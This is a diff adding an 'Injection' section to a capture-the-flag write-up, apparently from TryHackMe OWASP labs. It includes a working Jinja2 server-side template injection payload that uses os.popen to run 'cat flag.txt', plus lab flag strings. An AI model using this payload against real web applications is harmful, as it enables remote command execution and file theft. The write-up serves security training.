@@ -153,6 +153,19 @@ Which reveals the flag:
 
 <img width="631" height="826" alt="image" src="https://github.com/user-attachments/assets/b6b1f07a-0b9e-4232-8194-45283cee8781" />
 
+## A05: Injection
+
+Writeup: 
+
+Class SSTI Payload: 
+
+```
+{{self.__init__.__globals__['__builtins__']['__import__']('os').popen('cat flag.txt').read()}}
+```
+
+<img width="1114" height="848" alt="image" src="https://github.com/user-attachments/assets/313a67ee-db91-4f5a-8b85-f36915430f73" />
+
+Flag: ```THM{SSTI_FLAG_OBTAINED}```
 
 Flag: `THM{CRYPTO_FAILURE_H4RDCOD3D_K3Y}`
 
